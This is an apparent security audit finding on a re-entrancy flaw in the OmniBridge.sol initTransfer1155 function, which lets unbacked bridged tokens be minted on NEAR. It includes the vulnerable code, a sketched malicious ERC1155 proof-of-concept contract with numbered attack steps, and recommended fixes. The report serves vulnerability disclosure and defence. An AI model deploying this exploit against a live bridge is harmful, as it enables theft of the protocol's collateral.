### Title
Re-entrancy via Malicious ERC1155 Token in `initTransfer1155` Enables Unauthorized NEAR-Side Minting — (`evm/src/omni-bridge/contracts/OmniBridge.sol`)

### Summary

`initTransfer1155` in `OmniBridge.sol` calls `IERC1155(tokenAddress).safeTransferFrom` on a fully attacker-controlled contract address with no reentrancy guard. A malicious ERC1155 token can re-enter `initTransfer1155` during that external call, causing multiple `InitTransfer` events to be emitted with distinct, valid nonces while locking zero real tokens. The NEAR side treats each emitted event as proof of a locked deposit and mints the corresponding bridged tokens, resulting in unbacked minting.

### Finding Description

`initTransfer1155` accepts an arbitrary `tokenAddress` from the caller with no whitelist check:

```solidity
function initTransfer1155(
    address tokenAddress,   // fully attacker-controlled
    uint256 tokenId,
    uint128 amount,
    ...
) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
    currentOriginNonce += 1;                          // (A) nonce bumped first

    address deterministicToken = deriveDeterministicAddress(tokenAddress, tokenId);

    IERC1155(tokenAddress).safeTransferFrom(          // (B) external call to attacker contract
        msg.sender,
        address(this),
        tokenId,
        amount,
        ""
    );

    ...
    emit BridgeTypes.InitTransfer(                    // (C) event emitted AFTER external call
        msg.sender,
        deterministicToken,
        currentOriginNonce,
        ...
    );
}
``` [1](#0-0) 

The nonce is incremented at **(A)** before the external call at **(B)**, so each re-entrant invocation receives a fresh, unique nonce. The `InitTransfer` event is emitted at **(C)** only after the external call returns, meaning the event is emitted for every frame of the re-entrant call stack as it unwinds. A malicious `safeTransferFrom` implementation can call back into `initTransfer1155` arbitrarily many times before returning, never actually transferring any tokens to the bridge.

The `onERC1155Received` guard only blocks *direct* ERC1155 pushes (operator ≠ bridge):

```solidity
function onERC1155Received(address operator, ...) external view override returns (bytes4) {
    if (operator != address(this)) {
        revert ERC1155DirectSendNotAllowed();
    }
    return this.onERC1155Received.selector;
}
``` [2](#0-1) 

This guard is irrelevant to the attack: the malicious token's `safeTransferFrom` calls back into `initTransfer1155` directly, not through `onERC1155Received`. There is no `ReentrancyGuard` on `initTransfer1155`.

`logMetadata1155` is also fully permissionless, so the attacker can pre-register the malicious token to ensure the NEAR side recognises the deterministic address: [3](#0-2) 

### Impact Explanation

Each re-entrant frame emits a valid `InitTransfer` event with a unique `currentOriginNonce`. The NEAR bridge contract treats every such event as proof that the corresponding amount of tokens was locked on EVM and mints the equivalent bridged tokens to the attacker's NEAR address. The attacker locks zero (or one) real ERC1155 tokens but receives N × `amount` minted tokens on NEAR — a direct, unbacked inflation of bridged supply and theft of value from the protocol's collateral pool.

### Likelihood Explanation

The entry point is fully public (`external`, no role check, no whitelist). Any address can supply an arbitrary `tokenAddress`. Deploying a malicious ERC1155 contract costs only gas. No privileged access, leaked keys, or external dependency failure is required. The attack is self-contained in a single transaction.

### Recommendation

1. **Add `ReentrancyGuard`**: Apply OpenZeppelin's `nonReentrant` modifier to `initTransfer1155` (and `initTransfer` for consistency).
2. **Checks-Effects-Interactions**: Emit `InitTransfer` and call `initTransferExtension` *before* the external `safeTransferFrom` call, or record the nonce in a used-nonces mapping before the call.
3. **Token allowlist**: Require that `tokenAddress` is pre-registered via `logMetadata1155` (or an admin-gated list) before `initTransfer1155` will accept it.

### Proof of Concept

```solidity
contract MaliciousERC1155 is IERC1155 {
    OmniBridge bridge;
    uint256 depth;

    function safeTransferFrom(
        address from, address to, uint256 id, uint256 amount, bytes calldata
    ) external override {
        // Re-enter up to N times; never actually transfer tokens
        if (depth < 5) {
            depth++;
            bridge.initTransfer1155(
                address(this), id, uint128(amount), 0, 0, "attacker.near", ""
            );
            depth--;
        }
        // onERC1155Received is never called; no tokens move
    }
    // ... other IERC1155 stubs
}

// Attack:
// 1. Deploy MaliciousERC1155 pointing at bridge
// 2. (Optional) bridge.logMetadata1155(address(malicious), tokenId)
// 3. malicious.attack() → calls bridge.initTransfer1155(...)
//    → 5 InitTransfer events emitted, nonces N..N+4
//    → 0 real tokens locked
//    → NEAR side mints 5 × amount tokens to attacker
``` [4](#0-3)

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L234-270)
```text
    function logMetadata1155(
        address tokenAddress,
        uint256 tokenId
    ) external payable {
        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        MultiTokenInfo storage multiToken = multiTokens[deterministicToken];

        if (multiToken.tokenAddress == address(0)) {
            multiToken.tokenAddress = tokenAddress;
            multiToken.tokenId = tokenId;
        } else {
            if (
                multiToken.tokenAddress != tokenAddress ||
                multiToken.tokenId != tokenId
            ) {
                revert ERC1155MappingMismatch();
            }
        }

        logMetadataExtension(
            deterministicToken,
            Strings.toHexString(tokenAddress),
            "",
            0
        );

        emit BridgeTypes.LogMetadata(
            deterministicToken,
            Strings.toHexString(tokenAddress),
            "",
            0
        );
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L439-490)
```text
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        IERC1155(tokenAddress).safeTransferFrom(
            msg.sender,
            address(this),
            tokenId,
            amount,
            ""
        );

        uint256 extensionValue = msg.value - nativeFee;

        initTransferExtension(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L522-535)
```text
    function onERC1155Received(
        address operator,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external view override returns (bytes4) {
        // Only accept transfers that were initiated by this contract itself
        if (operator != address(this)) {
            revert ERC1155DirectSendNotAllowed();
        }

        return this.onERC1155Received.selector;
    }
```
